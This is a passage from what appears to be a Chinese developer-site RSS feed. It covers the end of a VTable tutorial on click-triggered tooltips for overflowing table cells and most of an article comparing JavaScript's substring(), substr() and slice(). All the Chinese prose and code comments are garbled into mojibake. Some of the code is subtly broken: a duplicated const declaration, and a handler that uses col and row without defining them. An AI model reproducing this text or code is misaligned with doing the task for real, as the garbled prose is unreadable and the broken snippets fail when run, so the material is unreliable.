ç›´æ¥åœ¨åˆå§‹åŒ–çš„æ—¶å€™ï¼ŒæŠŠ <code>config.tootip.isShowOverflowTextTooltip</code> é…ç½®ä¸º <code>true</code> å³å¯ã€‚</p>
<p>å¦‚æœå¼€å‘æ²¡æœ‰é…ç½® <code>VTable</code> <code>config</code> çš„åˆå§‹åŒ–æƒé™çš„è¯ï¼Œä¹Ÿå¯ä»¥åœ¨ <code>VTable</code> åˆå§‹åŒ–å¥½åï¼Œé€šè¿‡ <code>updateOption</code> æ¥æ›´æ–°é…ç½®ï¼Œæ³¨æ„ä¸è¦è¦†ç›–æ‰åŸç”Ÿçš„å…¶ä»–é…ç½®é¡¹ã€‚</p>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">const</span> tableInstance = tableRef.<span class="hljs-property">value</span>?.<span class="hljs-property">table</span>;
tableInstance.<span class="hljs-title function_">updateOption</span>({
    ...tableInstance.<span class="hljs-property">options</span>,
    <span class="hljs-attr">tooltip</span>: {
      ...tableInstance.<span class="hljs-property">options</span>.<span class="hljs-property">tooltip</span>,
      <span class="hljs-attr">isShowOverflowTextTooltip</span>: <span class="hljs-literal">true</span>,
    }
});
</code></pre>
<h4 data-id="heading-5">3.1.2 ç›‘å¬ç”¨æˆ·çš„ç‚¹å‡»äº‹ä»¶å±•ç¤º tooltip</h4>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">import</span> { <span class="hljs-variable constant_">TABLE_EVENT_TYPE</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vtable'</span>;

tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">TABLE_EVENT_TYPE</span>.<span class="hljs-property">CLICK_CELL</span>, <span class="hljs-function">(<span class="hljs-params">args: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> isOverflow = <span class="hljs-title function_">isCellTextOverflow</span>(tableInstance, col, row);
    <span class="hljs-keyword">if</span> (!isOverflow) {
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// è°ƒç”¨å†…éƒ¨ TooltipHandler æ‰‹åŠ¨æ˜¾ç¤ºæ°”æ³¡</span>
      <span class="hljs-comment">// æ³¨æ„ï¼šinternalProps æ˜¯å†…éƒ¨å±æ€§ï¼Œä½¿ç”¨æ—¶éœ€è¦æ³¨æ„ TypeScript ç±»å‹å…¼å®¹ï¼ˆå¦‚éœ€ï¼‰</span>
      tableInstance.<span class="hljs-property">internalProps</span>.<span class="hljs-property">tooltipHandler</span>.<span class="hljs-title function_">showTooltip</span>(col, row);
    }, <span class="hljs-number">10</span>);
});
</code></pre>
<p>ç‚¹å‡»æœ‰æº¢å‡ºçš„ cellï¼Œå°±ä¼šåœ¨ cell é™„è¿‘å±•ç¤ºå‡ºæ¥çš„ VTable åŸç”Ÿçš„æ°”æ³¡äº†ï¼Œé•¿å¾—è¿˜æ˜¯æœ‰ç‚¹ä¸‘çš„ï¼Œå¦‚æœè¦ç”¨çš„è¯ï¼Œå»ºè®®åœ¨ <code>VTable</code> çš„ <code>option</code> é‡ŒåŠ ç‚¹æ ·å¼çš„é…ç½®ã€‚</p>
<p>å¦å¤–è¿™ä¸ªæ°”æ³¡çš„æ¶ˆå¤±é€»è¾‘æ˜¯ <code>VTable</code> åŸç”Ÿè‡ªå·±æ§åˆ¶çš„ï¼Œçµæ•åº¦ä¹Ÿè¾ƒä¸€èˆ¬ï¼Œä¸ä¼šåŠæ—¶æ¶ˆå¤±ï¼Œæœ‰ç²¾åŠ›ä¹Ÿå¯ç”»æ—¶é—´ç›‘å¬ä¼˜åŒ–ï¼Œè°ƒç”¨ <code>VTable</code> åŸç”Ÿå‡½æ•°çš„éšè—æ–¹æ³•ã€‚</p>
<h3 data-id="heading-6">3.2 è‡ªå®šä¹‰ DIV å±•ç¤º tooltip</h3>
<h4 data-id="heading-7">3.2.1 å†™ä¸ªè‡ªå®šä¹‰çš„ div</h4>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"tooltipTxt"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"{ left, top }"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-popup"</span>&gt;</span>
  {{ tooltipTxt }}
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">const</span> tooltipTxt = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);
<span class="hljs-keyword">const</span> left = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'0px'</span>);
<span class="hljs-keyword">const</span> top = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'0px'</span>);
</code></pre>
<p>é…ä¸ªå¥½çœ‹ç‚¹çš„æ°”æ³¡æ ·å¼</p>
<pre><code class="hljs language-SCSS" lang="SCSS"><span class="hljs-selector-class">.custom-popup</span> {
  <span class="hljs-attribute">position</span>: fixed;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">10</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.65</span>);
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">8px</span>;
  &amp;<span class="hljs-selector-pseudo">::after</span> {
    <span class="hljs-attribute">content</span>: <span class="hljs-string">''</span>;
    <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
    <span class="hljs-comment">/* è¾¹æ¡†å®½åº¦ï¼šä¸Š4px | å³4px | ä¸‹4px | å·¦0ï¼ˆä»…å³è¾¹æ¡†æœ‰å®½åº¦ï¼‰ */</span>
    <span class="hljs-attribute">border-width</span>: <span class="hljs-number">4px</span> <span class="hljs-number">4px</span> <span class="hljs-number">4px</span> <span class="hljs-number">0</span>;
    <span class="hljs-attribute">border-style</span>: solid;
    <span class="hljs-comment">/* è¾¹æ¡†é¢œè‰²ï¼šä¸Šé€æ˜ | å³ç°è‰² | ä¸‹é€æ˜ | å·¦é€æ˜ï¼ˆä»…å³è¾¹æ¡†æ˜¾ç¤ºï¼‰ */</span>
    <span class="hljs-attribute">border-color</span>: transparent <span class="hljs-number">#333</span> transparent transparent;
    <span class="hljs-comment">/* æ¶ˆé™¤é»˜è®¤ç©ºç™½ï¼ˆé¿å…å­—ä½“/è¡Œé«˜å¯¼è‡´çš„é—´éš™ï¼‰ */</span>
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">left</span>: -<span class="hljs-number">6px</span>;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">margin</span>: auto;
    <span class="hljs-attribute">position</span>: absolute;
  }
}
</code></pre>
<h4 data-id="heading-8">3.2.2 ç›‘å¬å¹¶ä¸”å±•ç¤ºè‡ªå®šä¹‰æ°”æ³¡</h4>
<pre><code class="hljs language-Typescript" lang="Typescript">tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-string">'click_cell'</span>, <span class="hljs-function">(<span class="hljs-params">args: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
    <span class="hljs-comment">// å…ˆæŠŠæ—§çš„æ°”æ³¡å¹²æ‰</span>
    tooltipTxt.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;

    <span class="hljs-keyword">const</span> { col, row, value } = args;

    <span class="hljs-comment">// è¿‡æ»¤éæ•°æ®è¡Œ</span>
    <span class="hljs-keyword">if</span> (col &lt; <span class="hljs-number">0</span> || row &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æº¢å‡º</span>
    <span class="hljs-keyword">const</span> isOverflow = <span class="hljs-title function_">isCellTextOverflow</span>(tableInstance, col, row, value);

    <span class="hljs-keyword">if</span> (!isOverflow) {
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 1. è·å–åˆ—å®½</span>
    <span class="hljs-keyword">const</span> colWidth = tableInstance.<span class="hljs-title function_">getColWidth</span>(col);
    <span class="hljs-comment">// 1. è·å–åˆ—é«˜</span>
    <span class="hljs-keyword">const</span> colHeight = tableInstance.<span class="hljs-title function_">getRowHeight</span>(col);

    <span class="hljs-keyword">const</span> { offsetX, offsetY } = args.<span class="hljs-property">event</span>;
    left.<span class="hljs-property">value</span> = offsetX - colWidth * <span class="hljs-number">0.2</span> + <span class="hljs-string">'px'</span>;
    top.<span class="hljs-property">value</span> = offsetY - colHeight / <span class="hljs-number">2</span> + <span class="hljs-string">'px'</span>;
    tooltipTxt.<span class="hljs-property">value</span> = value;
});
</code></pre>
<h4 data-id="heading-9">3.2.3 ç›‘å¬ç‚¹å‡»/æ»šåŠ¨äº‹ä»¶ éšè—æ°”æ³¡</h4>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">import</span> { <span class="hljs-variable constant_">TABLE_EVENT_TYPE</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vtable'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">hideTooltip</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (tooltipTxt.<span class="hljs-property">value</span>) {
    tooltipTxt.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
  }
};

<span class="hljs-keyword">const</span> tableInstance = tableRef.<span class="hljs-property">value</span>?.<span class="hljs-property">table</span>;<span class="hljs-keyword">const</span> tableInstance = tableRef.<span class="hljs-property">value</span>?.<span class="hljs-property">table</span>;

tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">TABLE_EVENT_TYPE</span>.<span class="hljs-property">SCROLL</span>, hideTooltip);
tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">TABLE_EVENT_TYPE</span>.<span class="hljs-property">RESIZE_COLUMN</span>, hideTooltip);
<span class="hljs-comment">// ç›‘å¬æ ‘å½¢ç»“æ„å˜åŒ–ï¼ˆå±•å¼€/æŠ˜å è§¦å‘æ—¶ä¹Ÿå¼ºåˆ¶å…³æ‰ï¼ŒåŒé‡ä¿é™©ï¼‰</span>
tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">TABLE_EVENT_TYPE</span>.<span class="hljs-property">TREE_HIERARCHY_STATE_CHANGE</span>, hideTooltip);
<span class="hljs-comment">// å¦‚æœä½ ç”¨äº†è‡ªåŠ¨é«˜åº¦çš„æ–¹æ¡ˆï¼Œå»ºè®®ä¹Ÿç›‘å¬ UPDATED</span>
tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">TABLE_EVENT_TYPE</span>.<span class="hljs-property">UPDATED</span>, hideTooltip);

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, hideTooltip, <span class="hljs-literal">true</span>);
});

<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, hideTooltip, <span class="hljs-literal">true</span>);
});
</code></pre>
<h2 data-id="heading-10">4. æ€»ç»“</h2>
<p>æä¾›çš„ä¸¤ä¸ªè§£å†³æ€è·¯æ€§èƒ½æ¶ˆè€—éƒ½ä¸å¤§ï¼Œéƒ½å¯ä»¥æ»¡è¶³éœ€æ±‚ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[substringå’Œsubstræœ‰ä»€ä¹ˆåŒºåˆ«]]></title>    <link>https://juejin.cn/post/7592531796039942178</link>    <guid>https://juejin.cn/post/7592531796039942178</guid>    <pubDate>2026-01-07T14:53:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592531796039942178" data-draft-id="7592531796039909410" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="substringå’Œsubstræœ‰ä»€ä¹ˆåŒºåˆ«"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-07T14:53:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç çŒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/624972624037374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            substringå’Œsubstræœ‰ä»€ä¹ˆåŒºåˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624972624037374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç çŒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T14:53:09.000Z" title="Wed Jan 07 2026 14:53:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>substring()</code>Â å’ŒÂ <code>substr()</code>Â éƒ½æ˜¯ç”¨äºæˆªå–å­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œä½†å®ƒä»¬åœ¨å‚æ•°å«ä¹‰å’Œè¡Œä¸ºä¸Šæœ‰é‡è¦åŒºåˆ«ã€‚<strong><code>substr()</code>Â ç°å·²åºŸå¼ƒ</strong>ï¼Œä¸å»ºè®®åœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-0">ä¸»è¦åŒºåˆ«å¯¹æ¯”è¡¨</h2>








































<table><thead><tr><th>ç‰¹æ€§</th><th><code>substring(start, end)</code></th><th><code>substr(start, length)</code></th></tr></thead><tbody><tr><td><strong>å‚æ•°å«ä¹‰</strong></td><td>start: èµ·å§‹ç´¢å¼• end: ç»“æŸç´¢å¼•</td><td>start: èµ·å§‹ç´¢å¼• length: è¦æˆªå–çš„å­—ç¬¦æ•°</td></tr><tr><td><strong>ç»“æŸå‚æ•°</strong></td><td>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç»“æŸç´¢å¼•ï¼ˆä¸åŒ…å«ï¼‰</td><td>ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æˆªå–çš„é•¿åº¦</td></tr><tr><td><strong>è´Ÿæ•°å‚æ•°</strong></td><td>å°†è´Ÿæ•°è½¬æ¢ä¸º 0</td><td>è´Ÿæ•° start: ä»å­—ç¬¦ä¸²æœ«å°¾å€’æ•° è´Ÿæ•° length: è¿”å›ç©ºå­—ç¬¦ä¸²</td></tr><tr><td><strong>å‚æ•°é¡ºåº</strong></td><td>å¦‚æœ start &gt; endï¼Œä¼šè‡ªåŠ¨äº¤æ¢å‚æ•°</td><td>ä¸ä¼šäº¤æ¢å‚æ•°</td></tr><tr><td><strong>ECMAScript çŠ¶æ€</strong></td><td><strong>æ¨èä½¿ç”¨</strong></td><td><strong>å·²åºŸå¼ƒ</strong>Â (ä¸æ¨èä½¿ç”¨)</td></tr><tr><td><strong>æ›¿ä»£æ–¹æ¡ˆ</strong></td><td>æœ¬èº«å¯ç”¨</td><td>ä½¿ç”¨Â <code>slice()</code>Â æˆ–Â <code>substring()</code></td></tr></tbody></table>
<h2 data-id="heading-1">è¯¦ç»†è¯´æ˜</h2>
<h3 data-id="heading-2"><code>substring(startIndex, endIndex)</code></h3>
<ul>
<li><strong>å‚æ•°</strong>ï¼š
<ul>
<li><code>startIndex</code>ï¼šå¿…éœ€ï¼Œèµ·å§‹ä½ç½®ï¼ˆåŒ…å«ï¼‰</li>
<li><code>endIndex</code>ï¼šå¯é€‰ï¼Œç»“æŸä½ç½®ï¼ˆä¸åŒ…å«ï¼‰</li>
</ul>
</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼š
<ul>
<li>å¦‚æœçœç•¥Â <code>endIndex</code>ï¼Œåˆ™æˆªå–åˆ°å­—ç¬¦ä¸²æœ«å°¾</li>
<li>å¦‚æœä»»ä¸€å‚æ•°ä¸ºè´Ÿæ•°ï¼Œä¼šè¢«å½“ä½œ 0 å¤„ç†</li>
<li>å¦‚æœÂ <code>startIndex &gt; endIndex</code>ï¼Œä¼šè‡ªåŠ¨äº¤æ¢ä¸¤ä¸ªå‚æ•°</li>
<li>å¦‚æœå‚æ•°æ˜¯Â <code>NaN</code>ï¼Œä¼šè¢«å½“ä½œ 0</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> str = <span class="hljs-string">"Hello World"</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">6</span>));      <span class="hljs-comment">// "World"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">6</span>, <span class="hljs-number">11</span>));  <span class="hljs-comment">// "World"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">6</span>, <span class="hljs-number">7</span>));   <span class="hljs-comment">// "W"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>));   <span class="hljs-comment">// "Hel" (å‚æ•°è‡ªåŠ¨äº¤æ¢)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(-<span class="hljs-number">3</span>));     <span class="hljs-comment">// "Hello World" (è´Ÿæ•°å˜0)</span>
</code></pre>
<h3 data-id="heading-3"><code>substr(startIndex, length)</code>Â âŒï¼ˆå·²åºŸå¼ƒï¼‰</h3>
<ul>
<li><strong>å‚æ•°</strong>ï¼š
<ul>
<li><code>startIndex</code>ï¼šå¿…éœ€ï¼Œèµ·å§‹ä½ç½®</li>
<li><code>length</code>ï¼šå¯é€‰ï¼Œè¦æˆªå–çš„å­—ç¬¦æ•°</li>
</ul>
</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼š
<ul>
<li><code>startIndex</code>Â å¯ä»¥æ˜¯è´Ÿæ•°ï¼Œè¡¨ç¤ºä»å­—ç¬¦ä¸²æœ«å°¾å€’æ•°</li>
<li>å¦‚æœÂ <code>length</code>Â ä¸º 0 æˆ–è´Ÿæ•°ï¼Œè¿”å›ç©ºå­—ç¬¦ä¸²</li>
<li>å¦‚æœçœç•¥Â <code>length</code>ï¼Œåˆ™æˆªå–åˆ°å­—ç¬¦ä¸²æœ«å°¾</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> str = <span class="hljs-string">"Hello World"</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(<span class="hljs-number">6</span>));       <span class="hljs-comment">// "World"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(<span class="hljs-number">6</span>, <span class="hljs-number">5</span>));    <span class="hljs-comment">// "World"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(<span class="hljs-number">6</span>, <span class="hljs-number">1</span>));    <span class="hljs-comment">// "W"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(-<span class="hljs-number">3</span>));      <span class="hljs-comment">// "rld" (ä»å€’æ•°ç¬¬3ä¸ªå¼€å§‹)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(-<span class="hljs-number">5</span>, <span class="hljs-number">2</span>));   <span class="hljs-comment">// "Wo"</span>
</code></pre>
<h2 data-id="heading-4">ç°ä»£æ›¿ä»£æ–¹æ¡ˆï¼š<code>slice()</code></h2>
<p>ç”±äºÂ <code>substr()</code>Â å·²åºŸå¼ƒï¼Œ<strong>æ¨èä½¿ç”¨Â <code>slice()</code>Â ä½œä¸ºæ›¿ä»£</strong>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> str = <span class="hljs-string">"Hello World"</span>;

<span class="hljs-comment">// åŸºæœ¬ç”¨æ³•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">6</span>));       <span class="hljs-comment">// "World"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">6</span>, <span class="hljs-number">11</span>));   <span class="hljs-comment">// "World"</span>

<span class="hljs-comment">// æ”¯æŒè´Ÿæ•°ç´¢å¼•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">5</span>));      <span class="hljs-comment">// "World" (æœ€å5ä¸ªå­—ç¬¦)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, -<span class="hljs-number">6</span>));   <span class="hljs-comment">// "Hello" (ä»å¼€å¤´åˆ°å€’æ•°ç¬¬6ä¸ª)</span>

<span class="hljs-comment">// è´Ÿæ•°å‚æ•°è¡¨ç¤ºä»æœ«å°¾å¼€å§‹è®¡æ•°</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">6</span>, -<span class="hljs-number">1</span>));   <span class="hljs-comment">// "Worl" (ä»ç´¢å¼•6åˆ°å€’æ•°ç¬¬1ä¸ª)</span>
</code></pre>
<h2 data-id="heading-5">ä¸‰ç§æ–¹æ³•å¯¹æ¯”</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> str = <span class="hljs-string">"JavaScript"</span>;

<span class="hljs-comment">// æ­£æ•°å‚æ•°</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">4</span>, <span class="hljs-number">7</span>));  <span class="hljs-comment">// "Scr" (ç´¢å¼•4åˆ°7)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(<span class="hljs-number">4</span>, <span class="hljs-number">3</span>));     <span class="hljs-comment">// "Scr" (ä»ç´¢å¼•4å¼€å§‹ï¼Œå–3ä¸ªå­—ç¬¦)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">4</span>, <span class="hljs-number">7</span>));      <span class="hljs-comment">// "Scr" (ç´¢å¼•4åˆ°7)</span>

<span class="hljs-comment">// è´Ÿæ•°å‚æ•°</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(-<span class="hljs-number">3</span>));     <span class="hljs-comment">// "JavaScript" (è´Ÿæ•°å˜0)</span>
